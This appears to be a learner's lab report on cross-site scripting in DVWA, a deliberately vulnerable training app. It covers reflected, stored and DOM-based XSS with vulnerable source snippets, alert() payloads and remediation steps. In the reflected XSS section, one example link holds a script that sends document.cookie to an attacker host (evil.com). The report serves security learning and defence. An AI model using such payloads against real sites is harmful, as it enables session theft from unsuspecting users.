# DVWA Security Assessment — Cross-Site Scripting (XSS)

**Tester:** Devansh
**Target:** DVWA (Damn Vulnerable Web Application)
**Security Level:** Low
**Date:** Day 3 — July 2026

---

## 1. Summary

DVWA (Low security) is vulnerable to all three major XSS variants — Reflected, Stored, and DOM-based — due to user-controlled input being rendered into HTML/JavaScript context without output encoding. A key finding: SQL-injection sanitization (`mysqli_real_escape_string`) does **not** protect against XSS, since it only escapes SQL-special characters, not HTML-special characters. Each context requires its own escaping mechanism.

---

## 2. Reflected XSS

**File:** `vulnerabilities/xss_r/source/low.php`

```php
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
```

**Root cause:** `$_GET['name']` is echoed directly into the HTML response with no encoding.

**Payload:**
```
<script>alert('XSS')</script>
```

**Result:** Script executed immediately in the browser, confirming the input was interpreted as HTML/JS rather than plain text.

**Characteristics:** Not persisted — only affects the specific request. Requires the attacker to get the victim to click a crafted link containing the payload.

**Real-world risk:** An attacker could craft a link like:
```
http://site.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```
Sent via email/social media — clicking it silently exfiltrates the victim's session cookie.

---

## 3. Stored XSS

**File:** `vulnerabilities/xss_s/source/low.php`

```php
$message = mysqli_real_escape_string($conn, $message);
$name    = mysqli_real_escape_string($conn, $name);
$query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
```

**Key finding:** `mysqli_real_escape_string()` only escapes SQL-special characters (quotes, backslashes) to prevent SQL injection. It does **not** escape HTML-special characters (`<`, `>`), so the input is SQL-safe but still XSS-vulnerable when later rendered in HTML.

**Payload (in message field):**
```
<script>alert('Stored XSS')</script>
```

**Result:** Script persisted in the database and executed every time the guestbook page was viewed — no repeated action needed from the attacker after the initial injection.

**Why this is more severe than Reflected:** No victim interaction (link click) required. Every visitor to the page is automatically affected. Attacker injects once, impact scales to all future visitors.

| | Reflected | Stored |
|---|---|---|
| Data persists? | No | Yes (database) |
| Trigger | Victim clicks malicious link | Automatic on page visit |
| Blast radius | One victim per attack | All visitors |

---

## 4. DOM-Based XSS

**File:** `vulnerabilities/xss_d/source/low.php` — contains no server-side logic at all (`# No protections, anything goes`). The vulnerability is entirely in **client-side JavaScript**.

**Vulnerable client-side pattern (typical):**
```javascript
document.write("<select><option>" + document.location.href.substring(document.location.href.indexOf("default=") + 8) + "</option></select>");
```

**Root cause:** JavaScript reads the URL directly (`document.location.href`) and writes it into the DOM via `document.write()` with no sanitization. The server never sees or processes this value — the entire vulnerability exists client-side, after the page has already loaded.

**Payload:**
```
http://localhost/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
```

**Result:** Script executed on page load, before any form submission — the dropdown was empty, confirming execution happened purely client-side via URL parsing.

---

## 5. Comparison Table

| Type | Data source | Processed by | Persistence |
|---|---|---|---|
| Reflected | URL/form input | Server (echoes in response) | Single request only |
| Stored | Form input | Server (saved to DB, then rendered) | Permanent until removed |
| DOM-based | URL/browser state | Client-side JavaScript only | Session/URL-dependent |

**Common root cause across all three:** Untrusted input rendered into an HTML/JS context without output encoding.

---

## 6. Remediation

1. **Output encode at render time** — use `htmlspecialchars()` (PHP) or equivalent before writing any user-controlled data into HTML.
2. **Context-aware escaping** — SQL escaping ≠ HTML escaping ≠ JS escaping. Each output context needs its own encoding.
3. **For DOM-based XSS specifically:** avoid `document.write()`/`innerHTML` with untrusted data; use `textContent` or safe DOM APIs, and validate/sanitize any value read from `location.href` or similar client-side sources.
4. **Content Security Policy (CSP)** as defense-in-depth to restrict inline script execution.

---

## Next Steps
- [x] SQL Injection
- [x] XSS (Reflected, Stored, DOM)
- [ ] CSRF
